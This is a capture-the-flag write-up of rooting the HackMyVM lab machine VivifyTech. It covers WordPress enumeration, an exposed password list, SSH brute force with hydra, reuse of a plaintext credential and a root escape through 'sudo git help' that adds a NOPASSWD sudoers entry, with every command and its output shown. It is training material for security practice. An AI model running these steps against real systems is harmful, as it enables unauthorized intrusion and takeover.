# VivifyTech

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| VivifyTech | Sancelisso | Beginner | HackMyVM |

**Summary:** The exploitation of the VivifyTech machine began with a comprehensive network discovery and service enumeration that revealed an active WordPress installation. Initial reconnaissance through directory brute forcing and automated scanning uncovered a sensitive file named secrets.txt within the wp:includes directory, which served as a custom wordlist for further attacks. By combining this discovered password list with a set of usernames gathered from a specific blog post on the site, a successful SSH brute force attack was conducted against the user sarah. Once initial access was established, internal enumeration of the filesystem led to the discovery of a hidden task list containing plaintext credentials for another user named gbodja. Lateral movement to this second account revealed that the user possessed sudo privileges to execute the git binary without a password. This misconfiguration was ultimately leveraged through the git help system to escape the restricted environment and obtain a root shell, allowing for the successful retrieval of both the user and root flags.

---

## Reconnaissance

The initial phase involved identifying the target machine on the local network using a custom PowerShell script followed by a detailed port scan to understand the available attack surface.

1. **Network Discovery**:
The internal network was scanned to locate the VivifyTech virtual machine.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.181 08:00:27:DF:9E:77 VirtualBox
```

2. **Port Scanning**:
A full TCP port scan was performed using nmap to identify open services and their versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ nmap -sC -sV -p- 192.168.100.181
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-09 09:25 WIB
Nmap scan report for 192.168.100.181
Host is up (0.0039s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey:
|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp  open  mysql?
33060/tcp open  mysqlx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.77 seconds
```

3. **Web Directory Enumeration**:
Navigating to the web root showed a default Apache page. A dirsearch scan was initiated to find hidden directories.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ dirsearch -u http://192.168.100.181 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Output File: /tmp/vivifytech/reports/http_192.168.100.181/_26-05-09_09-33-19.txt

Target: http://192.168.100.181/

[09:33:19] Starting:
[09:33:22] 301 -  322B  - /wordpress  ->  http://192.168.100.181/wordpress/
```

4. **WordPress Scanning**:
The discovery of a WordPress directory prompted a specialized scan using wpscan to identify users, plugins, and vulnerabilities.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ wpscan --url http://192.168.100.181/wordpress/ --api-token 6Fhuq4ZKlwkOkhsHUtDa9RvIMsN7G09UNnKc8QKPOa4 --enumerate ap,at,tt,cb,dbe,u,m --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.100.181/wordpress/ [192.168.100.181]
[+] Started: Sat May  9 09:38:09 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.100.181/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.100.181/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.100.181/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.100.181/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.100.181/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.1</generator>
 |  - http://192.168.100.181/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.1</generator>
 |
 | [!] 9 vulnerabilities identified:
 |
 | [!] Title: WP 6.4-6.4.1 - POP Chain
 |     Fixed in: 6.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3
 |      - https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 6.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 6.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.5.2 - Unauthenticated Stored XSS
 |     Fixed in: 6.4.4
 |     References:
 |      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
 |      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:04:42 <===============> (120043 / 120043) 100.00% Time: 00:04:42
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.100.181/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2026-04-23T22:34:00.000Z
 | Readme: http://192.168.100.181/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/plugins/akismet/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:14 <=================> (32164 / 32164) 100.00% Time: 00:01:14
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] twentytwentythree
 | Location: http://192.168.100.181/wordpress/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.100.181/wordpress/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://192.168.100.181/wordpress/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.3'

[+] twentytwentytwo
 | Location: http://192.168.100.181/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.100.181/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://192.168.100.181/wordpress/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.100.181/wordpress/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.6'

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:05 <===================> (2575 / 2575) 100.00% Time: 00:00:05

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <======================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <============================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:02 <=================> (100 / 100) 100.00% Time: 00:00:02

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] sancelisso
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.100.181/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Sat May  9 09:44:44 2026
[+] Requests Done: 155167
[+] Cached Requests: 20
[+] Data Sent: 45.261 MB
[+] Data Received: 21.14 MB
[+] Memory used: 483.223 MB
[+] Elapsed time: 00:06:35
```

---

## Vulnerability Discovery

The scanning results indicated several potential vectors, including an outdated WordPress version and directory listing.

1. **Internal WordPress Enumeration**:
A more granular enumeration was performed using gobuster on the WordPress directories.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ gobuster dir -u http://192.168.100.181/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.181/wordpress/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 333] [--> http://192.168.100.181/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 334] [--> http://192.168.100.181/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 331] [--> http://192.168.100.181/wordpress/wp-admin/]
```

2. **Information Disclosure in wp:includes**:
Focusing on the wp:includes directory revealed a highly suspicious file named secrets.txt.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ gobuster dir -u http://192.168.100.181/wordpress/wp-includes/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.181/wordpress/wp-includes/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 341] [--> http://192.168.100.181/wordpress/wp-includes/images/]
/rss.php              (Status: 500) [Size: 0]
/category.php         (Status: 200) [Size: 0]
/media.php            (Status: 500) [Size: 0]
/user.php             (Status: 200) [Size: 0]
/feed.php             (Status: 200) [Size: 0]
/version.php          (Status: 200) [Size: 0]
/assets               (Status: 301) [Size: 341] [--> http://192.168.100.181/wordpress/wp-includes/assets/]
/registration.php     (Status: 500) [Size: 0]
/post.php             (Status: 200) [Size: 0]
/comment.php          (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 338] [--> http://192.168.100.181/wordpress/wp-includes/css/]
/template.php         (Status: 200) [Size: 0]
/date.php             (Status: 500) [Size: 0]
/update.php           (Status: 500) [Size: 0]
/js                   (Status: 301) [Size: 337] [--> http://192.168.100.181/wordpress/wp-includes/js/]
/query.php            (Status: 200) [Size: 0]
/taxonomy.php         (Status: 200) [Size: 0]
/cache.php            (Status: 500) [Size: 0]
/theme.php            (Status: 200) [Size: 0]
/blocks               (Status: 301) [Size: 341] [--> http://192.168.100.181/wordpress/wp-includes/blocks/]
/blocks.php           (Status: 200) [Size: 0]
/http.php             (Status: 200) [Size: 0]
/meta.php             (Status: 500) [Size: 0]
/widgets              (Status: 301) [Size: 342] [--> http://192.168.100.181/wordpress/wp-includes/widgets/]
/widgets.php          (Status: 200) [Size: 0]
/bookmark.php         (Status: 200) [Size: 0]
/cron.php             (Status: 200) [Size: 0]
/fonts.php            (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 340] [--> http://192.168.100.181/wordpress/wp-includes/fonts/]
/customize            (Status: 301) [Size: 344] [--> http://192.168.100.181/wordpress/wp-includes/customize/]
/plugin.php           (Status: 200) [Size: 0]
/functions.php        (Status: 500) [Size: 0]
/certificates         (Status: 301) [Size: 347] [--> http://192.168.100.181/wordpress/wp-includes/certificates/]
/load.php             (Status: 200) [Size: 0]
/capabilities.php     (Status: 200) [Size: 0]
/locale.php           (Status: 500) [Size: 0]
/secrets.txt          (Status: 200) [Size: 439]
/Text                 (Status: 301) [Size: 339] [--> http://192.168.100.181/wordpress/wp-includes/Text/]
/session.php          (Status: 500) [Size: 0]
/sitemaps             (Status: 301) [Size: 343] [--> http://192.168.100.181/wordpress/wp-includes/sitemaps/]
/sitemaps.php         (Status: 200) [Size: 0]
/compat.php           (Status: 200) [Size: 0]
/embed.php            (Status: 200) [Size: 0]
/revision.php         (Status: 200) [Size: 0]
/option.php           (Status: 200) [Size: 0]
Progress: 104179 / 882232 (11.81%)^C
```

The file content was extracted, serving as a list of potential passwords.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ curl http://192.168.100.181/wordpress/wp-includes/secrets.txt
agonglo
tegbesou
paparazzi
womenintech
Password123
bohicon
agodjie
tegbessou
Oba
IfÃ¨
Abomey
Gelede
BeninCity
Oranmiyan
Zomadonu
Ewuare
Brass
Ahosu
Igodomigodo
Edaiken
Olokun
Iyoba
Agasu
Uzama
IhaOminigbon
Agbado
OlokunFestival
Ovoranmwen
Eghaevbo
EwuareII
Egharevba
IgueFestival
Isienmwenro
Ugie-Olokun
Olokunworship
Ukhurhe
OsunRiver
Uwangue
miammiam45
Ewaise
Iyekowa
Idia
Olokunmask
Emotan
OviaRiver
Olokunceremony
Akenzua
Edoculture
```

3. **Username Harvesting**:
A manual review of the blog post at `/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/` provided visual evidence of potential usernames associated with the company. Including the CEO in the first page.

![alt text](image.png)

The following names were compiled into a users.txt file for brute force attempts.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ cat users.txt
sancelisso
sarah
mark
emily
jake
alex
steiner
```

---

## Exploitation

With a list of potential users and passwords, the focus shifted to gaining access via SSH.

1. **SSH Brute Force**:
The hydra tool was utilized to test the combinations against the SSH service.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ hydra -L ./users.txt -P ./passwords.txt ssh://192.168.100.181
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-09 10:31:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 336 login tries (l:7/p:48), ~21 tries per task
[DATA] attacking ssh://192.168.100.181:22/
[22][ssh] host: 192.168.100.181   login: sarah   password: b[REDACTED]
```

2. **Initial Access**:
Logging in as sarah allowed for the retrieval of the first flag and further internal exploration.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vivifytech]
└─$ ssh sarah@192.168.100.181
sarah@192.168.100.181's password:
Linux VivifyTech 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
#######################################
 #      Welcome to VivifyTech !      #
 #      The place to be :)           #
#######################################
Last login: Tue Dec  5 17:54:16 2023 from 192.168.177.129
sarah@VivifyTech:~$ id
uid=1001(sarah) gid=1001(sarah) groups=1001(sarah),100(users)
sarah@VivifyTech:~$ ls -la
total 32
drwx------ 4 sarah sarah 4096 Dec  5  2023 .
drwxr-xr-x 6 root  root  4096 Dec  5  2023 ..
-rw------- 1 sarah sarah    0 Dec  5  2023 .bash_history
-rw-r--r-- 1 sarah sarah  245 Dec  5  2023 .bash_logout
-rw-r--r-- 1 sarah sarah 3565 Dec  5  2023 .bashrc
-rw------- 1 sarah sarah    0 Dec  5  2023 .history
drwxr-xr-x 3 sarah sarah 4096 Dec  5  2023 .local
drwxr-xr-x 2 sarah sarah 4096 Dec  5  2023 .private
-rw-r--r-- 1 sarah sarah  807 Dec  5  2023 .profile
-rw-r--r-- 1 sarah sarah   27 Dec  5  2023 user.txt
```

---

## Internal Enumeration

Inside sarah's home directory, a hidden folder named .private was found containing a task list with sensitive information.

1. **Credential Discovery**:
The Tasks.txt file contained plaintext credentials for another user on the system.

```bash
sarah@VivifyTech:~$ ls -la ./.private/
total 12
drwxr-xr-x 2 sarah sarah 4096 Dec  5  2023 .
drwx------ 4 sarah sarah 4096 Dec  5  2023 ..
-rw-r--r-- 1 sarah sarah  274 Dec  5  2023 Tasks.txt
sarah@VivifyTech:~$ cat ./.private/Tasks.txt
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tc[REDACTED]
```

2. **System Enumeration**:
Checking the available users on the system confirmed the existence of multiple potential targets.

```bash
sarah@VivifyTech:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user,,,:/home/user:/bin/bash
sarah:x:1001:1001:Sarah,,,:/home/sarah:/bin/bash
gbodja:x:1002:1002:gbodja,,,:/home/gbodja:/bin/bash
emily:x:1003:1003:Emily,,,:/home/emily:/bin/bash
```

3. **Lateral Movement**:
Switching to the gbodja account provided a higher level of access and different sudo permissions.

```bash
sarah@VivifyTech:~$ su - gbodja
Password:
gbodja@VivifyTech:~$ id
uid=1002(gbodja) gid=1002(gbodja) groups=1002(gbodja),100(users)
gbodja@VivifyTech:~$ ls -la
total 24
drwx------ 3 gbodja gbodja 4096 Dec  5  2023 .
drwxr-xr-x 6 root   root   4096 Dec  5  2023 ..
-rw------- 1 gbodja gbodja    0 Dec  5  2023 .bash_history
-rw-r--r-- 1 gbodja gbodja  245 Dec  5  2023 .bash_logout
-rw-r--r-- 1 gbodja gbodja 3565 Dec  5  2023 .bashrc
-rw------- 1 gbodja gbodja    0 Dec  5  2023 .history
drwxr-xr-x 3 gbodja gbodja 4096 Dec  5  2023 .local
-rw-r--r-- 1 gbodja gbodja  807 Dec  5  2023 .profile
```

---

## Privilege Escalation

The final stage involved exploiting a sudo misconfiguration to gain root access.

1. **Sudo Privileges**:
The `sudo -l` command revealed that gbodja could execute the git command as any user without providing a password.

```bash
gbodja@VivifyTech:~$ sudo -l
Matching Defaults entries for gbodja on VivifyTech:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    !admin_flag, use_pty

User gbodja may run the following commands on VivifyTech:
    (ALL) NOPASSWD: /usr/bin/git
```

2. **Git Help Escape**:
By running git help, the system opens a pager. From within this pager, a shell can be spawned with root privileges to modify the sudoers file.

```bash
gbodja@VivifyTech:~$ sudo /usr/bin/git help config
# echo "sarah ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/sarah
# exit
!done  (press RETURN)
gbodja@VivifyTech:~$ exit
logout
```

3. **Obtaining Root**:
With the sudoers file modified, the sarah account was granted full administrative privileges.

```bash
sarah@VivifyTech:~$ sudo -l
Matching Defaults entries for sarah on VivifyTech:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    !admin_flag, use_pty

User sarah may run the following commands on VivifyTech:
    (ALL : ALL) NOPASSWD: ALL
```

Final confirmation of root access and flag retrieval:

```bash
sarah@VivifyTech:~$ sudo -i
root@VivifyTech:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
VivifyTech
root@VivifyTech:~# cat /home/sarah/user.txt
HMV{Y0u[REDACTED]}
root@VivifyTech:~# cat /root/root.txt
HMV{Y4N[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Scanning the network for targets and performing a comprehensive port scan to identify the WordPress installation on port 80.
2. **Vulnerability Discovery**: Locating a sensitive secrets.txt file in the wp:includes directory and harvesting usernames from a blog post.
3. **Exploitation**: Conducting a successful SSH brute force attack against the user sarah using the discovered information.
4. **Internal Enumeration**: Identifying a hidden task list containing plaintext credentials for the user gbodja and performing lateral movement.
5. **Privilege Escalation**: Exploiting the NOPASSWD sudo permission for the git binary to escape to a root shell via the help system.